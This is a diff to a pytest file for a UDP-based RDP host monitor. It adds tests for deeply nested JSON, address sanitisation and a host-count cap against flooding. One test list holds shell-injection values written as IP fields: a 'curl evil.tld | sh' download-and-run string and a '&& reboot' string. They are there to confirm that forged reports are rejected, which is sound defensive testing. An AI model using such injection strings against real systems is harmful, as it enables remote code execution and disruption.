@@ -11,6 +11,7 @@ from lynxrdp_monitor.model import (
     MAX_DATAGRAM,
     NodeStore,
     Report,
+    clean_address,
     clean_text,
     format_age,
     format_uptime,
@@ -74,13 +75,35 @@ class TestParsing:
             b"null",
             b"{",
             b"\xff\xfe\x00binary",
+            # Deep enough to trip CPython's recursion limit inside the JSON
+            # scanner on 3.9 to 3.11, which raises RecursionError, not
+            # ValueError. Later versions parse it; either way it is not ours.
+            b"[" * 1200 + b"]" * 1200,
         ],
-        ids=["empty", "garbage", "array", "string", "number", "null", "truncated", "binary"],
+        ids=[
+            "empty", "garbage", "array", "string", "number", "null", "truncated",
+            "binary", "deeply-nested",
+        ],
     )
     def test_junk_is_ignored_rather_than_raising(self, raw):
         # A UDP port on a network receives scans and strays; none of it may
         # disturb the viewer.
         assert parse_report(raw) is None
+
+    def test_deep_nesting_inside_a_report_does_not_raise(self):
+        # The report-shaped variant: valid required fields beside a value
+        # nested past the recursion limit. Whether the interpreter can parse
+        # it decides between a row and None; an exception is the one outcome
+        # that must not happen, because it would abort the whole burst.
+        raw = (
+            b'{"node":"n","ip":"1.2.3.4","port":1,"x":'
+            + b"[" * 1200
+            + b"]" * 1200
+            + b"}"
+        )
+        assert len(raw) <= MAX_DATAGRAM
+        result = parse_report(raw)
+        assert result is None or result.node == "n"
 
     def test_oversized_datagrams_are_refused(self):
         big = json.dumps({"node": "n" * MAX_DATAGRAM, "ip": "1.2.3.4", "port": 1})
@@ -130,6 +153,45 @@ class TestParsing:
         r = parse_report(payload(node="büro-01"))
         assert r is not None and r.node == "büro-01"
 
+    @pytest.mark.parametrize(
+        "ip",
+        [
+            "10.0.0.5;curl${IFS}evil.tld|sh<b>",
+            "10.0.0.5 && reboot",
+            "desk01.example.org",
+            "10.0.0.5 ",
+            " 10.0.0.5",
+            "1.2.3",
+            "1.2.3.4/24",
+            "010.0.0.5",
+            "0x7f000001",
+            "fe80::1%eth0",
+            "<b>10.0.0.5</b>",
+            "[2001:db8::5]",
+        ],
+    )
+    def test_an_ip_that_is_not_an_address_refuses_the_whole_report(self, ip):
+        # The address is handed to the operator as a shell command line, so a
+        # sender who can forge a report (anyone: the key is public) must not
+        # be able to put anything but an address in it. Refusing the report
+        # rather than blanking the field keeps a forged report from replacing
+        # a real host's row with one that cannot be reached.
+        assert parse_report(payload(ip=ip)) is None
+
+    @pytest.mark.parametrize(
+        ("ip", "canonical"),
+        [
+            ("10.0.0.5", "10.0.0.5"),
+            ("2001:db8::5", "2001:db8::5"),
+            ("2001:0DB8:0000::0005", "2001:db8::5"),
+            ("::ffff:10.0.0.5", "::ffff:10.0.0.5"),
+            ("::1", "::1"),
+        ],
+    )
+    def test_addresses_are_kept_in_canonical_form(self, ip, canonical):
+        r = parse_report(payload(ip=ip))
+        assert r is not None and r.ip == canonical
+
 
 class TestCleanText:
     def test_non_strings_become_empty(self):
@@ -138,6 +200,21 @@ class TestCleanText:
 
     def test_printable_text_is_untouched(self):
         assert clean_text("desk-01.example.org") == "desk-01.example.org"
+
+
+class TestCleanAddress:
+    def test_non_strings_become_empty(self):
+        # An integer is a perfectly good IPv4 address to ipaddress.ip_address,
+        # and not something lynxrdpd sends.
+        for value in (None, 167772165, [], {}, True):
+            assert clean_address(value) == ""
+
+    def test_overlong_text_is_refused_before_parsing(self):
+        assert clean_address("1" * 65) == ""
+
+    def test_scoped_ipv6_is_refused(self):
+        assert clean_address("fe80::1%eth0") == ""
+        assert clean_address("fe80::1") == "fe80::1"
 
 
 class TestNodeStore:
@@ -182,6 +259,28 @@ class TestNodeStore:
         assert [r.node for r in store.rows()] == ["b"]
         store.clear()
         assert len(store) == 0
+
+    def test_a_full_store_refuses_new_hosts_but_keeps_updating_known_ones(self):
+        # Anyone who can reach the port can invent names without limit, and
+        # a table that grows with them stops redrawing in time. Known hosts
+        # must go on updating regardless: refusing them would let the flood
+        # freeze the real rows at their last report.
+        store = NodeStore(max_nodes=2)
+        assert store.update(parse_report(payload(node="a")))
+        assert store.update(parse_report(payload(node="b")))
+        assert store.full
+        assert not store.update(parse_report(payload(node="c")))
+        assert len(store) == 2 and store.refused == 1
+        assert not store.update(parse_report(payload(node="a", sessions=9)))
+        assert store.rows()[0].sessions == 9
+        assert store.refused == 1
+
+    def test_forgetting_a_host_frees_a_slot(self):
+        store = NodeStore(max_nodes=1)
+        store.update(parse_report(payload(node="a")))
+        store.forget("a")
+        assert not store.full
+        assert store.update(parse_report(payload(node="b")))
 
 
 class TestFormatting:
